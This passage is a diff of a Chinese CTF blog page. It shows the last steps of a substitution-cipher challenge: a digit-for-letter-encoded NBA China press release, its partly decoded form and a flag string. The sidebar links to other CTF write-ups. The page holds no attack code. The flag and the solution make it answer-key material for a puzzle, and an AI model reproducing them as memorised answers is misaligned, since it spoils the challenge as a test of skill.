+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BEI6ING - NBA CHINA AND THE CHINESE MINIST4O 1F EDUCATI1N ANN1UNCED M1NDAO AN ENTENSI1N 1F THEI4 ENISTING 2A4TNE4SHI2 T1 INC14214ATE FITNESS AND BAS7ETBALL DEVEL12MENT IN ELEMENTA4O, MIDDLE AND HIGH SCH11LS AC41SS CHINA.THE ANN1UNCEMENT MAS MADE AT A SIGNING CE4EM1NO T1DAO BO NBA CHINA CE1 DAVID SH1EMA7E4 AND NU TA1, DI4ECT14 GENE4AL 1F THE INTE4NATI1NAL C112E4ATI1N AND ENCHANGE DE2A4TMENT 1F THE MINIST4O 1F EDUCATI1N.</span><br><span class="line">&quot;ME A4E ENCITED T1 B41ADEN 1U4 2A4TNE4SHI2 MITH THE MINIST4O 1F EDUCATI1N T1 MA7E A L1NG-LASTING IM2ACT 1N THE LIVES 1F CHINESE STUDENTS TH41UGH A 61INTLO-DESIGNED BAS7ETBALL CU44ICULUM AND A MIDE 4ANGE 1F SCH11L BAS7ETBALL 241G4AMS,&quot; SAID SH1EMA7E4. &quot;THIS C1MMITMENT MA47S AN1THE4 MILEST1NE IN THE NBA&#x27;S O1UTH AND BAS7ETBALL DEVEL12MENT EFF14TS IN CHINA.&quot; FLAG &#123; GS1L2DMHCTMABCID&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>6.最后替换数字1.2.4，得到答案</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EI6ING - NBA CHINA AND THE CHINESE MINISTRO OF EDUCATION ANNOUNCED MONDAO AN ENTENSION OF THEIR ENISTING PARTNERSHIP TO INCORPORATE FITNESS AND BAS7ETBALL DEVELOPMENT IN ELEMENTARO, MIDDLE AND HIGH SCHOOLS ACROSS CHINA.THE ANNOUNCEMENT MAS MADE AT A SIGNING CEREMONO TODAO BO NBA CHINA CEO DAVID SHOEMA7ER AND NU TAO, DIRECTOR GENERAL OF THE INTERNATIONAL COOPERATION AND ENCHANGE DEPARTMENT OF THE MINISTRO OF EDUCATION.</span><br><span class="line">&quot;ME ARE ENCITED TO BROADEN OUR PARTNERSHIP MITH THE MINISTRO OF EDUCATION TO MA7E A LONG-LASTING IMPACT ON THE LIVES OF CHINESE STUDENTS THROUGH A 6OINTLO-DESIGNED BAS7ETBALL CURRICULUM AND A MIDE RANGE OF SCHOOL BAS7ETBALL PROGRAMS,&quot; SAID SHOEMA7ER. &quot;THIS COMMITMENT MAR7S ANOTHER MILESTONE IN THE NBA&#x27;S OOUTH AND BAS7ETBALL DEVELOPMENT EFFORTS IN CHINA.&quot; FLAG &#123; GSOLPDMHCTMABCID&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/19/2016%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/" data-id="cm63omqd90000uwus3bac28dl" data-title="破译" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-[GXYCTF2019]BabyUpload Write up" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/19/%5BGXYCTF2019%5DBabyUpload%20Write%20up/" class="article-date">
@@ -260,7 +476,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">一月 2025</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">二月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">一月 2025</a></li></ul>
     </div>
   </div>
 
@@ -273,15 +489,23 @@
       <ul>
         
           <li>
+            <a href="/2025/02/02/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%AD%A6%E4%B9%A0%EF%BC%8C%E5%8E%8B%E7%BC%A9%E5%8C%8516%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E5%90%AB%E4%B9%89%E5%88%86%E6%9E%90/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/19/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz%20%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF&%E8%BF%87%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/19/2016%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">破译</a>
+          </li>
+        
+          <li>
             <a href="/2025/01/19/%5BGXYCTF2019%5DBabyUpload%20Write%20up/">Hello World</a>
           </li>
         
           <li>
             <a href="/2025/01/15/baobao/">baobao</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/15/hello-world/">Hello World</a>
           </li>
         
       </ul>
